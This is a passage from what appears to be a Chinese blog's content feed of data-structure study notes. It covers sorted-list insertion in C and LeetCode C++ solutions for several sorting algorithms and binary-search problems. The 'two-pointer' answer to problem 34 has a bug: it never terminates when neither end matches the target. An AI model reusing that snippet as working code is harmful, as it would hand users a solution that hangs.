&amp;&amp; L-&gt;data[i] &gt; x)&#123; <span class="comment">// 确保 x 小于已给位置，便于将 x 插入到其前面</span></span><br><span class="line">            L-&gt;data[i+<span class="number">1</span>] = L-&gt;data[i];</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        L-&gt;data[i+<span class="number">1</span>] = x;	<span class="comment">// 插入 x </span></span><br><span class="line">        L-&gt;length++;		<span class="comment">// 顺序表长度加 1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[N];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(sqlist *L,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;length &lt; N)&#123;   <span class="comment">//确保顺序表不满，能够进行插入数据</span></span><br><span class="line">        i = L-&gt;length - <span class="number">1</span>; <span class="comment">// i 是最后一个元素位置</span></span><br><span class="line">		<span class="keyword">while</span>(i &gt;= <span class="number">0</span> &amp;&amp; L-&gt;data[i] &gt; x)&#123; <span class="comment">// 确保 x 小于已给位置，便于将 x 插入到其前面</span></span><br><span class="line">            L-&gt;data[i+<span class="number">1</span>] = L-&gt;data[i];</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        L-&gt;data[i+<span class="number">1</span>] = x;	<span class="comment">// 插入 x </span></span><br><span class="line">        L-&gt;length++;		<span class="comment">// 顺序表长度加 1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    sqlist <span class="built_in">list</span> = &#123;&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">22</span>,<span class="number">44</span>,<span class="number">89</span>,<span class="number">122</span>,<span class="number">243</span>,<span class="number">534</span>&#125;,<span class="number">10</span>&#125;;</span><br><span class="line">    insert(&amp;<span class="built_in">list</span>,<span class="number">350</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">list</span>.length;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">list</span>.data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/15/DHxBpZmaULCcFMS.png" alt="image-20210915211017268"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>顺序表</tag>
        <tag>线性存储</tag>
      </tags>
  </entry>
  <entry>
    <title>十二、排序</title>
    <url>/2025/12/03/%E5%8D%81%E4%BA%8C%E3%80%81%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="十二、排序"><a href="#十二、排序" class="headerlink" title="十二、排序"></a>十二、排序</h2><h3 id="912-排序数组"><a href="#912-排序数组" class="headerlink" title="912 排序数组"></a>912 排序数组</h3><p>给你一个整数数组 nums，请你将该数组【升序排列】。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    快排  随机取 参考元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot = nums[l];<span class="comment">//取nums[l]作为参考元素</span></span><br><span class="line">        <span class="keyword">int</span> i=l, j=r;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; nums[j]&gt;=pivot) j--;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; nums[i]&lt;=pivot) i++;</span><br><span class="line">            <span class="built_in">swap</span>(nums[i],nums[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">swap</span>(nums[i],nums[l]);</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">randomized_partition</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="built_in">rand</span>() % (r-l+<span class="number">1</span>) + l; <span class="comment">// 随机选一个作为我们的主元</span></span><br><span class="line">        <span class="built_in">swap</span>(nums[l], nums[i]);<span class="comment">//放到 nums[l]位置</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">partition</span>(nums, l, r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="keyword">int</span> pos = <span class="built_in">randomized_partition</span>(nums,l,r);<span class="comment">//划分</span></span><br><span class="line">            <span class="built_in">quick_sort</span>(nums,l,pos<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">quick_sort</span>(nums,pos+<span class="number">1</span>,r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">quick_sort</span>(nums,<span class="number">0</span>,nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    堆排序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">maxHeapify</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> i, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (; (i &lt;&lt; <span class="number">1</span>) + <span class="number">1</span> &lt;= len;) &#123;</span><br><span class="line">            <span class="keyword">int</span> lson = (i &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> rson = (i &lt;&lt; <span class="number">1</span>) + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">int</span> large;</span><br><span class="line">            <span class="keyword">if</span> (lson &lt;= len &amp;&amp; nums[lson] &gt; nums[i]) &#123;</span><br><span class="line">                large = lson;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                large = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (rson &lt;= len &amp;&amp; nums[rson] &gt; nums[large]) &#123;</span><br><span class="line">                large = rson;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (large != i) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[i], nums[large]);</span><br><span class="line">                i = large;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">buildMaxHeap</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = len / <span class="number">2</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="built_in">maxHeapify</span>(nums, i, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">heapSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = (<span class="keyword">int</span>)nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">buildMaxHeap</span>(nums, len);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = len; i &gt;= <span class="number">1</span>; --i) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(nums[i], nums[<span class="number">0</span>]);</span><br><span class="line">            len -= <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">maxHeapify</span>(nums, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">heapSort</span>(nums);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    归并排序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l&gt;=r) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">merge</span>(nums,l,mid);</span><br><span class="line">        <span class="built_in">merge</span>(nums,mid+<span class="number">1</span>,r);</span><br><span class="line">        <span class="keyword">int</span> i = l, j = mid+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=mid &amp;&amp; j&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&lt;=nums[j])</span><br><span class="line">                tmp[cnt++] = nums[i++];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                tmp[cnt++] = nums[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid) &#123;</span><br><span class="line">            tmp[cnt++] = nums[i++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (j &lt;= r) &#123;</span><br><span class="line">            tmp[cnt++] = nums[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;r-l+<span class="number">1</span>;i++)</span><br><span class="line">            nums[i+l] = tmp[i];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        tmp.<span class="built_in">resize</span>(nums.<span class="built_in">size</span>(),<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">merge</span>(nums,<span class="number">0</span>,nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  冒泡排序 */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=n<span class="number">-1</span>;j&gt;i;j--)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[j<span class="number">-1</span>]&gt;nums[j])&#123;</span><br><span class="line">                    <span class="built_in">swap</span>(nums[j<span class="number">-1</span>],nums[j]);</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag==<span class="literal">false</span>)</span><br><span class="line">                <span class="keyword">return</span> nums;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 插入排序 */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = nums[i];<span class="comment">//复制 哨兵放在tmp</span></span><br><span class="line">            <span class="keyword">int</span> j = i;</span><br><span class="line">            <span class="keyword">while</span>(j&gt;<span class="number">0</span> &amp;&amp; nums[j<span class="number">-1</span>]&gt;tmp)&#123;</span><br><span class="line">                nums[j] = nums[j<span class="number">-1</span>];<span class="comment">//后移</span></span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[j] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  折半插入 */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> l,r,mid;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = nums[i];<span class="comment">//复制 哨兵放在tmp</span></span><br><span class="line">            l = <span class="number">0</span>; r = i<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">                mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span>(nums[mid]&gt;tmp) r = mid<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">else</span> l = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="comment">//l&gt;r时 停止</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>;j&gt;=l;j--)<span class="comment">//把[l,i-1]后移</span></span><br><span class="line">                nums[j+<span class="number">1</span>] = nums[j];</span><br><span class="line">            nums[l] = tmp;<span class="comment">//最终插入位置是l</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title="704 二分查找"></a>704 二分查找</h3><p>给定一个 n 个元素有序的【升序】整型数组 nums 和一个目标值 target ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  法一：[left, right]</span></span><br><span class="line"><span class="comment">    定义 target 是在一个在[左闭右闭]的区间里，也就是[left, right]</span></span><br><span class="line"><span class="comment">    + while (left &lt;= right) 要使用 &lt;= ，因为left == right是有意义的，所以使用 &lt;=</span></span><br><span class="line"><span class="comment">    + if (nums[middle] &gt; target) right 要赋值为 middle - 1，因为当前这个nums[middle]一定不是target，那么接下来要查找的左区间结束下标位置就是 middle - 1</span></span><br><span class="line"><span class="comment">    + right = nums.size()-1;</span></span><br><span class="line"><span class="comment">    + int mid = left+(right-left)/2;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = nums.<span class="built_in">size</span>()<span class="number">-1</span>;<span class="comment">//[left, right]</span></span><br><span class="line">        <span class="comment">//int res = -1;   //注意 超出时间限制</span></span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = left+(right-left)/<span class="number">2</span>;<span class="comment">//防止溢出</span></span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &gt; target)</span><br><span class="line">                right = mid<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &lt; target)</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="keyword">return</span> mid;<span class="comment">//res = mid;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">//return res;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  法二：[left, right) </span></span><br><span class="line"><span class="comment">    定义 target 是在一个在左闭右开的区间里，也就是[left, right) </span></span><br><span class="line"><span class="comment">    + while (left &lt; right)，这里使用 &lt; ,因为left == right在区间[left, right)是没有意义的</span></span><br><span class="line"><span class="comment">    + if (nums[middle] &gt; target) right 更新为 middle，因为当前nums[middle]不等于target，去左区间继续寻找，而寻找区间是左闭右开区间，所以right更新为middle，即：下一个查询区间不会去比较nums[middle]</span></span><br><span class="line"><span class="comment">    + right = nums.size();</span></span><br><span class="line"><span class="comment">    + int middle = left+((right-left) &gt;&gt; 1);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = nums.<span class="built_in">size</span>(); <span class="comment">//[left, right)</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">int</span> middle = left+((right-left) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (nums[middle] &gt; target) &#123;</span><br><span class="line">                right = middle; <span class="comment">//区别</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[middle] &lt; target) &#123;</span><br><span class="line">                left = middle + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">                <span class="keyword">return</span> middle;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="34-在排序数组中查找元素的第一个和最后一个位置——二分法"><a href="#34-在排序数组中查找元素的第一个和最后一个位置——二分法" class="headerlink" title="34 在排序数组中查找元素的第一个和最后一个位置——二分法"></a>34 在排序数组中查找元素的第一个和最后一个位置——二分法</h3><p>给你一个按照【非递减顺序排列】的整数数组 nums，和一个目标值 target。请你找出给定目标值在数组中的开始位置和结束位置。<br>如果数组中不存在目标值 target，返回 [-1, -1]。<br>你必须设计并实现时间复杂度为 O(log n) 的算法解决此问题。</p>
<p><strong>分析：</strong><br>大部分能想到的解法，比如：遍历一次，分别记录第一次和最好一次；双指针等等。都是 <strong>O(n)&gt;O(logn)</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">searchRange</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//升序排序，相同元素紧邻</span></span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>,r=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> first = <span class="number">-1</span>,last = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[l]==target)&#123;</span><br><span class="line">                first = l;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(nums[r]==target)&#123;</span><br><span class="line">                last = r;</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;first,last&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>一看到时间复杂度是O(logn)，首先想到【二分查找】</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">searchRange</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//升序排序，相同元素紧邻</span></span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>,r=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> first = <span class="number">-1</span>,last = <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">//找左边界 first</span></span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = l+(r-l)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)&#123;</span><br><span class="line">                first = mid;<span class="comment">//确定左边界</span></span><br><span class="line">                r=mid<span class="number">-1</span>;<span class="comment">//重点</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid]&lt;target)</span><br><span class="line">                l=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                r=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找右边界 last</span></span><br><span class="line">        l=<span class="number">0</span>,r=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = l+(r-l)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)&#123;</span><br><span class="line">                last = mid;<span class="comment">//确定右边界</span></span><br><span class="line">                l=mid+<span class="number">1</span>;<span class="comment">//重点</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid]&lt;target)</span><br><span class="line">                l=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                r=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;first,last&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="367-有效的完全平方数——二分法"><a href="#367-有效的完全平方数——二分法" class="headerlink" title="367 有效的完全平方数——二分法"></a>367 有效的完全平方数——二分法</h3><p>给你一个正整数 num 。如果 num 是一个完全平方数，则返回 true ，否则返回 false 。<br>【<strong>完全平方数</strong>】：是一个可以写成某个整数的平方的整数。换句话说，它可以写成某个整数和自身的乘积。<br>不能使用任何内置的库函数，如  sqrt 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPerfectSquare</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>,r=num;<span class="comment">//r=num;</span></span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid=l+(r-l)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>((<span class="keyword">long</span> <span class="keyword">long</span>) mid*mid==num)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>((<span class="keyword">long</span> <span class="keyword">long</span>) mid*mid&lt;num)</span><br><span class="line">                l=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                r=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="35-搜索插入位置——二分法【有序】"><a href="#35-搜索插入位置——二分法【有序】" class="headerlink" title="35 搜索插入位置——二分法【有序】"></a>35 搜索插入位置——二分法【有序】</h3><p>给定一个<strong>排序数组</strong>和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。<br>请必须使用时间复杂度为 O(log n) 的算法。<br><strong>有序——二分法</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    二分法——有序数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>,right = nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target)</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; 